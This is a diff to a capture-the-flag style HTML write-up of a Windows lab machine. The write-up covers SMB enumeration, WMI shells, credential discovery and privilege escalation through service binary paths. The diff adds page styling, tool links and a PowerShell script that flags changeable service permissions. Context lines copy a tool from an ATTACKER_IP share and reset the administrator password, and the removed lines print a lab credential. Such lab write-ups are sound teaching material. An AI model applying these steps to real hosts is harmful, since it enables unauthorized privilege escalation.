@@ -21,7 +21,7 @@
 
   <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
   <link rel="apple-touch-icon" href="../assets/favicon.png" />
-  <link rel="stylesheet" href="../style.css?v=4"/>
+  <link rel="stylesheet" href="../style.css?v=5"/>
   <style>
     /* Machine info box styling */
     .machine-info {
@@ -113,6 +113,77 @@
     .path-indicator strong {
       color: #c77dff;
     }
+
+    /* Collapsible code block styling */
+    .collapsible-code {
+      margin: 1rem 0;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .collapsible-code .code-preview {
+      background: #1a1a2e;
+      border: 1px solid rgba(0, 170, 255, 0.2);
+      border-radius: 8px 8px 0 0;
+      padding: 1rem;
+      font-family: 'Consolas', 'Monaco', monospace;
+      font-size: 0.9rem;
+      overflow-x: auto;
+      margin: 0;
+    }
+
+    .collapsible-code .code-full {
+      background: #1a1a2e;
+      border: 1px solid rgba(0, 170, 255, 0.2);
+      border-top: none;
+      padding: 0 1rem 1rem 1rem;
+      font-family: 'Consolas', 'Monaco', monospace;
+      font-size: 0.9rem;
+      overflow-x: auto;
+      margin: 0;
+      display: none;
+    }
+
+    .collapsible-code.expanded .code-full {
+      display: block;
+    }
+
+    .collapsible-code.expanded .code-preview {
+      border-radius: 8px 8px 0 0;
+      border-bottom: 1px dashed rgba(0, 170, 255, 0.15);
+    }
+
+    .code-toggle-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 0.6rem 1rem;
+      background: rgba(0, 170, 255, 0.08);
+      border: 1px solid rgba(0, 170, 255, 0.2);
+      border-top: none;
+      border-radius: 0 0 8px 8px;
+      color: #00aaff;
+      font-family: inherit;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: background 0.2s ease, color 0.2s ease;
+    }
+
+    .code-toggle-btn:hover {
+      background: rgba(0, 170, 255, 0.15);
+      color: #33bbff;
+    }
+
+    .code-toggle-btn .toggle-arrows {
+      font-size: 1rem;
+      margin-right: 0.5rem;
+      font-weight: bold;
+    }
+
+    .collapsible-code.expanded .code-toggle-btn {
+      border-top: none;
+    }
   </style>
 </head>
 <body>
@@ -183,11 +254,11 @@
       <li><strong>Platform:</strong> HackSmarter Labs</li>
       <li><strong>Difficulty:</strong> <span class="difficulty-easy">Easy</span></li>
       <li><strong>OS:</strong> Windows 11 / Server 2025</li>
-      <li><strong>Key Skills:</strong> SMB Enumeration, RDP Access, PowerShell History Analysis, Service Binary Path Manipulation</li>
+      <li><strong>Key Topics:</strong> SMB Enumeration, RDP Access, PowerShell History Analysis, Service Binary Path Manipulation</li>
     </ul>
   </div>
 
-  <h3>Objective</h3>
+  <h3>Overview</h3>
   <p>Following a successful social engineering engagement, I obtained user-level credentials for a corporate workstation. The goal is to leverage this initial access to perform reconnaissance on the internal Windows host, escalate privileges, and capture the root flag from the administrator's directory.</p>
 
   <div class="key-finding">
@@ -339,10 +410,10 @@ net user administrator "[REDACTED]"</code></pre>
     <strong>What is wmiexec2?</strong>
   </div>
   <div class="answer">
-    <p>wmiexec2 is an improved version of Impacket's wmiexec that provides a semi-interactive shell over WMI (Windows Management Instrumentation). It is useful when direct SMB execution (psexec/smbexec) is blocked or unavailable.</p>
+    <p><a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener noreferrer">wmiexec2</a> is an improved version of Impacket's wmiexec that provides a semi-interactive shell over WMI (Windows Management Instrumentation). It is useful when direct SMB execution (psexec/smbexec) is blocked or unavailable.</p>
   </div>
 
-  <p><strong>Installation:</strong></p>
+  <p><strong>Installation:</strong> (<a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener noreferrer">GitHub repository</a>)</p>
   <pre><code>$ git clone https://github.com/ice-wzl/wmiexec2
 $ cd wmiexec2
 $ python3 -m venv venv
@@ -408,11 +479,7 @@ Mode                 LastWriteTime         Length Name
   <p>The hidden <code>desktop.ini</code> file contains credentials:</p>
   <pre><code>PS C:\Management> type .\desktop.ini
 [.ShellClassInfo]
-InfoTip=CREDS: alice.wonderland:2wsxzaq1@WSXZAQ!</code></pre>
-
-  <div class="key-finding">
-    <strong>New credentials discovered:</strong> <code>alice.wonderland:2wsxzaq1@WSXZAQ!</code>
-  </div>
+InfoTip=CREDS: alice.wonderland:[REDACTED]</code></pre>
 
   <p>I used these credentials to establish a new RDP session as <code>alice.wonderland</code>.</p>
 
@@ -456,7 +523,110 @@ PS C:\> copy \\ATTACKER_IP\sharename\PrivescCheck.ps1 C:\Users\alice.wonderland\
     <p>When a low-privileged user has permissions to modify a service's configuration (specifically the binary path via <code>SERVICE_CHANGE_CONFIG</code>), they can change it to execute arbitrary commands. When the service starts (often as SYSTEM), the attacker's command runs with elevated privileges.</p>
   </div>
 
-  <p>I analyzed the service permissions using a custom script that decodes Windows SDDL (Security Descriptor Definition Language):</p>
+  <p>I analyzed the service permissions using a custom script that decodes Windows SDDL (Security Descriptor Definition Language) to identify exploitable service permissions. This script parses the SDDL string returned by <code>sc.exe sdshow</code> and translates the cryptic permission codes into human-readable format, highlighting dangerous permissions like <code>SERVICE_CHANGE_CONFIG</code>.</p>
+
+  <p><strong>Usage:</strong></p>
+  <pre><code># Save as Check-ServicePermissions.ps1, then import:
+Import-Module .\Check-ServicePermissions.ps1
+
+# Usage:
+Check-ServicePermissions -ServiceName "SysMgmtAgent"</code></pre>
+
+  <div class="collapsible-code" id="sddl-script">
+    <pre class="code-preview"><code>function Check-ServicePermissions {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$ServiceName
+    )</code></pre>
+    <pre class="code-full"><code>
+    # Permission mappings
+    $permissionFlags = @{
+        'CC' = 'Query Config'
+        'LC' = 'Query Status'
+        'SW' = 'Enumerate Dependents'
+        'RP' = 'START SERVICE'
+        'WP' = 'STOP SERVICE'
+        'DT' = 'Pause/Resume'
+        'LO' = 'Query Lock'
+        'CR' = 'User-Defined Control'
+        'RC' = 'Read Security'
+        'DC' = 'CHANGE CONFIG'
+        'SD' = 'Delete'
+        'WD' = 'Write DAC'
+        'WO' = 'Write Owner'
+    }
+
+    # Well-known SIDs
+    $wellKnownSids = @{
+        'SY' = 'NT AUTHORITY\SYSTEM'
+        'BA' = 'BUILTIN\Administrators'
+        'IU' = 'Interactive Users'
+        'SU' = 'Service Users'
+        'AU' = 'Authenticated Users'
+        'WD' = 'Everyone'
+        'BU' = 'BUILTIN\Users'
+    }
+
+    # Get SDDL
+    $sddl = (sc.exe sdshow $ServiceName) | Where-Object { $_ -match '^\w' }
+
+    if (-not $sddl) {
+        Write-Host "[-] Could not retrieve permissions for $ServiceName" -ForegroundColor Red
+        return
+    }
+
+    Write-Host "`n[*] Service: $ServiceName" -ForegroundColor Cyan
+    Write-Host "[*] Raw SDDL: $sddl`n" -ForegroundColor DarkGray
+
+    # Parse each ACE
+    $pattern = '\(A;;([A-Z]+);;;([^\)]+)\)'
+    $matches = [regex]::Matches($sddl, $pattern)
+
+    foreach ($match in $matches) {
+        $perms = $match.Groups[1].Value
+        $sid = $match.Groups[2].Value
+
+        # Resolve SID to name
+        if ($wellKnownSids.ContainsKey($sid)) {
+            $identity = $wellKnownSids[$sid]
+        } elseif ($sid -match '^S-1-') {
+            try {
+                $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
+                $identity = $objSID.Translate([System.Security.Principal.NTAccount]).Value
+            } catch {
+                $identity = $sid
+            }
+        } else {
+            $identity = $sid
+        }
+
+        # Decode permissions
+        $decodedPerms = @()
+        for ($i = 0; $i -lt $perms.Length; $i += 2) {
+            $code = $perms.Substring($i, 2)
+            if ($permissionFlags.ContainsKey($code)) {
+                $decodedPerms += $permissionFlags[$code]
+            }
+        }
+
+        # Check for dangerous permissions
+        $dangerous = $perms -match 'DC|RP|WP'
+        $color = if ($dangerous) { 'Yellow' } else { 'White' }
+
+        Write-Host "Identity: $identity" -ForegroundColor $color
+        Write-Host "Permissions: $($decodedPerms -join ', ')" -ForegroundColor $color
+
+        if ($perms -match 'DC') {
+            Write-Host "[!] VULNERABLE - Can change service config!" -ForegroundColor Red
+        }
+        Write-Host ""
+    }
+}</code></pre>
+    <button class="code-toggle-btn" onclick="toggleCodeBlock('sddl-script')" aria-expanded="false" aria-controls="sddl-script">
+      <span class="toggle-arrows" aria-hidden="true">▼▼</span>
+      <span class="toggle-text">Show full script (89 lines)</span>
+    </button>
+  </div>
 
   <p><img src="../assets/slayer/service-permission-analysis.png" alt="Service permission analysis showing exploitable permissions" loading="lazy"></p>
 
@@ -516,7 +686,7 @@ The command completed successfully.</code></pre>
     <li><strong>Nmap</strong> - Port scanning</li>
     <li><strong>NetExec (nxc)</strong> - SMB enumeration</li>
     <li><strong>xfreerdp</strong> - RDP client</li>
-    <li><strong>wmiexec2</strong> - WMI shell</li>
+    <li><strong><a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener noreferrer">wmiexec2</a></strong> - WMI shell</li>
     <li><strong>PrivescCheck</strong> - Privilege escalation enumeration</li>
     <li><strong>Impacket SMB Server</strong> - File transfer</li>
   </ul>
@@ -598,5 +768,26 @@ SMB Validation --> RDP Access
   <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
 </footer>
 <script src="../script.js"></script>
+<script>
+// Toggle collapsible code blocks
+function toggleCodeBlock(elementId) {
+  const container = document.getElementById(elementId);
+  const button = container.querySelector('.code-toggle-btn');
+  const arrows = button.querySelector('.toggle-arrows');
+  const text = button.querySelector('.toggle-text');
+
+  if (container.classList.contains('expanded')) {
+    container.classList.remove('expanded');
+    arrows.textContent = '\u25BC\u25BC';
+    text.textContent = 'Show full script (89 lines)';
+    button.setAttribute('aria-expanded', 'false');
+  } else {
+    container.classList.add('expanded');
+    arrows.textContent = '\u25B2\u25B2';
+    text.textContent = 'Collapse script';
+    button.setAttribute('aria-expanded', 'true');
+  }
+}
+</script>
 </body>
 </html>
